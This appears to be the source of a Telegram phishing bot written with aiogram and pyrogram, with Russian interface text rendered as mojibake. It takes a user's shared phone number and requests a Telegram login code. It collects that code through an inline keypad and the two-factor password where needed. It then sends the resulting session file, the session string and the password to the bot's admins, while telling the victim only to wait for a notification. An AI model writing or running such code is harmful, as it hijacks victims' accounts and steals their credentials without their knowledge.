import random
import time
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text, ChatTypeFilter
from aiogram.types import InputFile
from pyrogram import Client
from pyrogram.errors import FloodWait, SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid

from data.config import ADMINS_ID, API_HASH, API_ID
from keyboards import code_menu
from loader import dp
from states import CodeNumber
from utils.db_commands import select_user, add_session


@dp.message_handler(ChatTypeFilter(chat_type=types.ChatType.PRIVATE), content_types=types.ContentType.CONTACT)
async def get_contact(message: types.Message, state: FSMContext):
    global client
    user = await select_user(message.from_user.id)
    if not user:
        try:
            client = Client(
                name=f'sessions/{message.contact.phone_number}',
                api_id=API_ID,
                api_hash=API_HASH,
                device_model=random.choice(['LGELG-F350K', 'Xiaomi Note 9', 'iPhone 14 Pro', 'Vivo Y19']),
                system_version=random.choice(['SDK 31', 'SDK 30', 'SDK 29']),
                lang_code=random.choice(['en-US', 'ru-RU']),
                app_version=random.choice(['8.8.2 (27022)', '10.2.2 (13011)', '8.4.2 (21023)', '5.1.2 (27022)'])
            )
            await client.connect()
            code_hash = await client.send_code(message.contact.phone_number)

            await state.update_data(
                number=message.contact.phone_number,
                code_hash=code_hash.phone_code_hash,
                code=''
            )
            await message.answer(
                f'<b>‚û°Ô∏è –í–∞—à –∫–æ–¥:</b>\n'
                f'üëá –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –æ—Ç <b>Telegram</b>:',
                reply_markup=code_menu('')
            )
            await CodeNumber.number.set()
        except FloodWait as flood:
            converted_time = time.strftime(
                '%H —á–∞—Å–æ–≤ %M –º–∏–Ω—É—Ç',
                time.gmtime(flood.value)
            )
            await message.answer(
                f'<b>‚ùóÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —á–µ—Ä–µ–∑ <code>{converted_time}</code></b>'
            )
    else:
        await message.answer(
            '<b>üåü –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –¥–æ–∂–¥–∏—Ç–µ—Å—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è!</b>'
        )


@dp.callback_query_handler(Text(startswith='code_number'), state=CodeNumber.number)
async def get_code_number(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if len(data['code']) < 5:
        code = data['code'] + call.data.split(':')[1]
        await state.update_data(code=code)

        await call.message.edit_text(
            f'<b>‚û°Ô∏è –í–∞—à –∫–æ–¥:</b> <code>{code}</code>\n'
            f'üëá –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –æ—Ç <b>Telegram</b>:',
            reply_markup=code_menu(code)
        )
        await call.answer(code)

    else:
        await call.answer(
            '‚ùóÔ∏è –í—ã —É–∂–µ –≤–≤–µ–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ü–∏—Ñ—Ä!',
            show_alert=True
        )


@dp.callback_query_handler(Text('delete_number'), state=CodeNumber.number)
async def delete_number(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    code = data['code'][:-1]
    await state.update_data(code=code)

    await call.message.edit_text(
        f'<b>‚û°Ô∏è –í–∞—à –∫–æ–¥:</b> <code>{code}</code>\n'
        f'üëá –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –æ—Ç <b>Telegram</b>:',
        reply_markup=code_menu(code)
    )
    await call.answer(code)


@dp.callback_query_handler(Text('clear_numbers'), state=CodeNumber.number)
async def delete_number(call: types.CallbackQuery, state: FSMContext):
    await state.update_data(code='')
    await call.message.edit_text(
        f'<b>‚û°Ô∏è –í–∞—à –∫–æ–¥:</b>\n'
        f'üëá –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –æ—Ç <b>Telegram</b>:',
        reply_markup=code_menu('')
    )
    await call.answer(
        'üîÑ Code cleared!'
    )


@dp.callback_query_handler(Text('confirm_code'), state=CodeNumber.number)
async def confirm_session(call: types.CallbackQuery, state: FSMContext):
    try:
        data = await state.get_data()
        await client.sign_in(
            phone_number=data['number'], phone_code=data['code'],
            phone_code_hash=data['code_hash']
        )
        user = await client.get_me()
        await add_session(
            call.from_user.id,
            data['number'],
            ''
        )
        for admin in ADMINS_ID:
            await dp.bot.send_document(
                chat_id=admin,
                document=InputFile(f'sessions/{data["number"]}.session'),
                caption=f'<b>üéâ –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è!</b>\n\n'
                        f'üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: <b>{call.from_user.get_mention(as_html=True)}</b> [<code>{call.from_user.id}</code>]\n'
                        f'üìû –¢–µ–ª–µ—Ñ–æ–Ω: <code>+{data["number"]}</code>\n'
                        f'üåü –ü—Ä–µ–º–∏—É–º: <code>{user.is_premium}</code>\n'
                        f'üö´ –°–∫–∞–º: <code>{user.is_scam}</code>\n'
                        f'üîë –°—Ç—Ä–æ–∫–∞ —Å–µ—Å—Å–∏–∏ (Pyrogram): \n<code>{(await client.export_session_string())}</code>'
            )
        await call.message.delete()
        await call.message.answer(
            '<b>‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã!</b>\n'
            '<b>üåü –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ–∂–∏–¥–∞–π—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ!</b>'
        )

        await client.disconnect()
        await state.finish()

    except SessionPasswordNeeded:
        await call.message.delete()
        await call.message.answer(
            '<b>üîë –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞</b>'
        )
        await CodeNumber.password.set()

    except PhoneCodeInvalid:
        await call.answer(
            '‚ùóÔ∏è –í–≤–µ–¥–µ–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥!',
            show_alert=True
        )


@dp.message_handler(ChatTypeFilter(chat_type=types.ChatType.PRIVATE), state=CodeNumber.password)
async def get_password(message: types.Message, state: FSMContext):
    data = await state.get_data()
    try:
        await client.check_password(message.text)
        user = await client.get_me()
        await add_session(
            message.from_user.id,
            data['number'],
            message.text
        )

        password = f'üõ° –ü–∞—Ä–æ–ª—å: <code>{message.text}</code>\n\n' if message.text != '' else ''
        for admin in ADMINS_ID:
            await dp.bot.send_document(
                chat_id=admin,
                document=InputFile(f'sessions/{data["number"]}.session'),
                caption=f'<b>üéâ –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è!</b>\n\n'
                        f'üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: <b>{message.from_user.get_mention(as_html=True)}</b> [<code>{message.from_user.id}</code>]\n'
                        f'üìû –¢–µ–ª–µ—Ñ–æ–Ω: <code>+{data["number"]}</code>\n'
                        f'{password}'
                        f'üåü –ü—Ä–µ–º–∏—É–º: <code>{user.is_premium}</code>\n'
                        f'üö´ –°–∫–∞–º: <code>{user.is_scam}</code>\n'
                        f'üîë –°—Ç—Ä–æ–∫–∞ —Å–µ—Å—Å–∏–∏ (Pyrogram): \n<code>{(await client.export_session_string())}</code>'
            )
        await message.answer(
            '<b>‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã!</b>\n'
            '<b>üåü –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ–∂–∏–¥–∞–π—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ!</b>'
        )

        await client.disconnect()
        await state.finish()
    except PasswordHashInvalid:
        await message.reply(
            '<b>‚ùóÔ∏è –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å!</b>\n'
            '<b>üîë –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞</b>'
        )
